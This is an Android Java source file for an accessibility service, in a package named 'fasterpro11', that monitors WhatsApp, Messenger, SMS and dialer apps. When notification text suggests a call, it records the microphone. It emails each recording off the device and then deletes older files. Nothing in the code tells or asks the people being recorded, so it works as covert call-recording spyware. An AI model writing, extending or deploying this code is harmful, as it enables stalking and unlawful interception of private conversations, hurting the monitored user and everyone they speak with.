package com.example.fasterpro11;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.Manifest;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import androidx.core.content.ContextCompat;
import androidx.core.app.ActivityCompat;
import android.content.pm.PackageManager;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.Locale;

public class CallRecorderAccessibilityService extends AccessibilityService {

    private static final String TAG = "CallRecorderService";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private MediaRecorder mediaRecorder;
    private String fileName;
    private Context mContext;
    private Context context;
    private static boolean isRecording = false;

    // Static variables to hold the latest notification data packageName
    public static String notificationCallingAppGlobalMessage1 = "";
    public static String notificationCallingAppGlobalMessage2 = "";
    public static String notificationCallingAppGlobalMessage3= "";
    public static String DelayPackageName= "";
    private static long lastUpdateTimestamp = 0;
    public static String RecordingDelyWhatesapp = "";
    private Handler handler;
    private static int executionCount = 0;
    private static int max = 15;

    @Override
    public void onCreate() {
        super.onCreate();
        mContext = getApplicationContext(); // এখন mContext আর null হবে না
        handler = new Handler(Looper.getMainLooper());
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Check if event is valid com.ludashi.dualspace ridmik.keyboard
        if (event == null){
            Log.d(TAG, "onAccessibilityEvent event : null ");
            return;
        }
        String packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown";
        Log.d(TAG, "event packageName : " + packageName);


        if (    packageName.equals("com.whatsapp") || packageName.equals("com.facebook.orca") ||
                packageName.equals("com.imo.android.imoim")||
                packageName.equals("com.vivo.sms")||
                packageName.equals("com.coloros.mms")||
                packageName.equals("com.samsung.android.messaging")|| packageName.equals("com.samsung.android.dialer")||
                packageName.equals("com.samsung.android.incallui")||
                packageName.equals("com.realme.android.dialer")|| packageName.equals("com.google.android.dialer")||
                packageName.equals("com.android.systemui")||
                packageName.equals("com.android.mms")|| packageName.equals("com.miui.sms")||
                packageName.equals("com.google.android.apps.messaging")||
                packageName.equals("com.android.mms.service")      ) {

                            // ✅ recording dely for whatesapp set
                            if (packageName.equals("com.whatsapp")) {
                                long currentTime = System.currentTimeMillis();
                                // Check if 5 seconds have passed since the last update
                                if ((currentTime - lastUpdateTimestamp) > 5000) {
                                    RecordingDelyWhatesapp = "WhatesappOk";
                                    lastUpdateTimestamp = currentTime; // update time
                                    Log.d(TAG, "recordingdelywhatesapp updated to: " + RecordingDelyWhatesapp);
                                } else {
                                    Log.d(TAG, "Less than 5 seconds since last update. Keeping previous value: " + RecordingDelyWhatesapp);
                                }
                            } else {
                                RecordingDelyWhatesapp = "WhatesappNotOk";
                                lastUpdateTimestamp = System.currentTimeMillis(); // update time for non-whatsapp as well
                                Log.d(TAG, "recordingdelywhatesapp set to: " + RecordingDelyWhatesapp);
                            }

                Log.d(TAG, "event packageName : " + packageName);
                //Retry logic get last running variable orginal value
                if (executionCount < max) {
                    executionCount++;
                    Log.d(TAG, "executionCount: " + executionCount);
                    handler.postDelayed(() -> processAccessibilityEvent(event), 1000);//  Retry  get last running variable orginal value
                }else {
                    processAccessibilityEvent(event);
                }
        }
    }


    public void processAccessibilityEvent(AccessibilityEvent event) {
        Log.d(TAG, "Received accessibility event: " + event.toString());
        if (event == null){
            Log.d(TAG, "processAccessibilityEvent event : null ");
            return;
        }
        Log.d(TAG, "processAccessibilityEvent executionCount: " + executionCount);
        // ✅ Updated way: Directly accessing static variables
        // Log the latest notification data
        Log.d(TAG, "CallRecorderAccessibilityglobalMessage1: " + notificationCallingAppGlobalMessage1);
        Log.d(TAG, "CallRecorderAccessibilityglobalMessage2: " + notificationCallingAppGlobalMessage2);
        Log.d(TAG, "CallRecorderAccessibilityglobalMessage3: " + notificationCallingAppGlobalMessage3);


        // Get the package name
        String packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown";
        DelayPackageName = packageName ;
        // Notification text (usually contains title/message)
        String notificationText = "";
        if (event.getText() != null && !event.getText().isEmpty()) {
            StringBuilder builder = new StringBuilder();
            for (CharSequence cs : event.getText()) {
                builder.append(cs).append(" ");
            }
            notificationText = builder.toString().trim().toLowerCase();  // Normalize
        }

        // Notification title is not directly accessible, often part of text or description
        String notificationTitle = (event.getContentDescription() != null)
                ? event.getContentDescription().toString().toLowerCase()
                : "";

        // Combine for keyword checking CallRecorderAccessibilityglobalMessage1
        String AccessibilityEventcombinedText = notificationTitle + " " + notificationText;
        Log.d(TAG, "AccessibilityEvent text : " + AccessibilityEventcombinedText);
        String combinedText = notificationCallingAppGlobalMessage1 + " " + notificationCallingAppGlobalMessage2+ " " + notificationCallingAppGlobalMessage3 + " " + AccessibilityEventcombinedText;
        Log.d(TAG, "processAccessibilityEvent all text: " + combinedText);

        // Start recording if call keywords found Calling… Ringing…
        if (combinedText.contains("call")|| combinedText.contains("calling") ||
                combinedText.contains("Calling…") || combinedText.contains("Ringing…") ||
                combinedText.contains("incoming") ||
                combinedText.contains("dialing") ||
                combinedText.contains("voice call") ||combinedText.contains("voice over call") ||
                combinedText.contains("on call") ) {
            Log.d(TAG, "Detected call keyword in notification" );
           // checkPermissionsAndStartRecording();  RecordingDelyWhatesapp ="whatesappnotok"
            String localDelayPackageName  =  packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown";
            if (RecordingDelyWhatesapp == "WhatesappOk") {
                // Get the package name
                Log.d(TAG, "match foe delay time . packageName  : " + RecordingDelyWhatesapp);
                handler.postDelayed(() -> checkPermissionsAndStartRecording(), 2 * 60000); //recording start after 2 minit
            }else {
                Log.d(TAG, "no match for dealy time . packageName : " + RecordingDelyWhatesapp);
                checkPermissionsAndStartRecording();
            }
        }else {
            Log.d(TAG, "no Detected call keyword in notification");
        }


        // Stop recording if call ends
        if (combinedText.contains("call ended") || combinedText.contains("disconnected") ||
                combinedText.contains("end call") || combinedText.contains("call finished")) {
            Log.d(TAG, "Detected end call keyword in notification");
            stopRecording();
        }else {
            Log.d(TAG, "no Detected call ended keyword in notification");
        }
    }




    public void checkPermissionsAndStartRecording() {
        if (!isAccessibilityEnabled(this)) {
            Log.d(TAG, "Accessibility permission not granted");
            promptEnableAccessibility();
            return;
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {

            Log.d(TAG, "Permissions not granted");
            // Note: In AccessibilityService, we can't directly request permissions
            // Need to handle this through main activity
            return;
        }

        startRecordingWithRetry();
    }

    private boolean isAccessibilityEnabled(Context context) {
        String serviceName = context.getPackageName() + "/" + this.getClass().getName();
        try {
            int accessibilityEnabled = Settings.Secure.getInt(
                    context.getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);

            if (accessibilityEnabled == 1) {
                String settingValue = Settings.Secure.getString(
                        context.getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);

                return settingValue != null && settingValue.contains(serviceName);
            }
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error checking accessibility setting", e);
        }
        return false;
    }

    private void promptEnableAccessibility() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "Service interrupted");
        stopRecording();
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.d(TAG, "Accessibility service connected");
    }

    private void startRecordingWithRetry() {
        if (isRecording) {
            Log.w(TAG, "Already recording");
            return;
        }

//        int[] audioSources = {
//                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
//                MediaRecorder.AudioSource.MIC,
//                MediaRecorder.AudioSource.VOICE_RECOGNITION
//        };
        int[] audioSources = {
                MediaRecorder.AudioSource.VOICE_COMMUNICATION, // For VoIP
                MediaRecorder.AudioSource.VOICE_RECOGNITION, // Optimized for voice
                MediaRecorder.AudioSource.MIC,  // Default microphone
                MediaRecorder.AudioSource.CAMCORDER,        
                MediaRecorder.AudioSource.DEFAULT
        };

        for (int source : audioSources) {
            if (tryRecordingWithSource(source)) {
                return;
            }
        }

        Log.e(TAG, "All recording attempts failed");
    }

    private boolean tryRecordingWithSource(int audioSource) {

        try {
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File outputDir = new File(Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_MUSIC), "CallRecordings");

            if (!outputDir.exists() && !outputDir.mkdirs()) {
                Log.e(TAG, "Failed to create directory");
                return false;
            }

            fileName = new File(outputDir, "call_" + timestamp + ".amr").getAbsolutePath();
            Log.d(TAG, "Attempting to record with source: " + audioSource);

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(audioSource);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(fileName);

            mediaRecorder.prepare();
            mediaRecorder.start();

            isRecording = true;
            Log.d(TAG, "Recording started successfully with source: " + audioSource);
            // Use handler to stop recording after 3 minutes (180 seconds)
            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(() -> stopRecording(), 1 * 60000); // 1 minutes recording limit
            return true;

        } catch (Exception e) {
            Log.e(TAG, "Recording failed with source " + audioSource + ": " + e.getMessage());
            resetMediaRecorder();
            return false;
        }
    }

    private void stopRecording() {
        if (!isRecording) {
            Log.w(TAG, "No active recording to stop");
            return;
        }

        try {
            Log.d(TAG, "Stopping recording");
            mediaRecorder.stop();
            executionCount=0;
            Log.d(TAG, "executionCount  reset: " + executionCount);
            Log.d(TAG, "Recording saved to: " + fileName);
        } catch (IllegalStateException e) {
            Log.e(TAG, "Stop failed - illegal state: " + e.getMessage());
        } catch (RuntimeException e) {
            Log.e(TAG, "Stop failed - runtime exception: " + e.getMessage());
        } finally {
            releaseMediaRecorder();
        }
    }

    private void resetMediaRecorder() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.reset();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error resetting media recorder", e);
        }
    }

    private void releaseMediaRecorder() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.release();
                mediaRecorder = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error releasing media recorder", e);
        }
        isRecording = false;
        executionCount=0;
        Log.d(TAG, "executionCount  reset: " + executionCount);

        if (isInternetAvailable()) {
            //    Log.d(TAG, "Internet available, sending recording via email");
            CallRecordSendEmail callRecordSendEmail = new CallRecordSendEmail();
            callRecordSendEmail.sendEmailWithAttachment("Sound Rec", "file:", fileName);

           // sendEmailWithAttachment("Sound Rec", "file:", fileName);
        } else {
            //   Log.d(TAG, "Internet not available, recording saved locally");
        }

        // 5. পুরানো রেকর্ডিং ডিলিট করুন
        deleteOldRecordings();


    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        stopRecording();
    }





    private void deleteOldRecordings() {
        Log.d(TAG, "Deleting old mic recordings...");
        File folder = new File(Environment.getExternalStorageDirectory() + "/Music/CallRecordings");
        File[] files = folder.listFiles();
        if (files != null && files.length > 2) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            }
            for (int i = 0; i < files.length - 2; i++) {
                if (files[i].delete()) {
                    Log.d(TAG, "Deleted old mic recording: " + files[i].getName());
                } else {
                    Log.e(TAG, "Failed to delete old mic recording: " + files[i].getName());
                }
            }
        }
    }


    public boolean isInternetAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;

            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            return netInfo != null && netInfo.isConnected();
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }


    public void CheckPermissionsAndStartRecording() {
        Log.d(TAG, "called from callrecorder class method of checkPermissionsAndStartRecording()");
        new Handler(Looper.getMainLooper()).post(this::startRecordingWithRetry);
    }

    public void StopRecording() {
        Log.d(TAG, "called from callracorder class method of checkPermissionsAndStartRecording().");
        stopRecording();
    }
}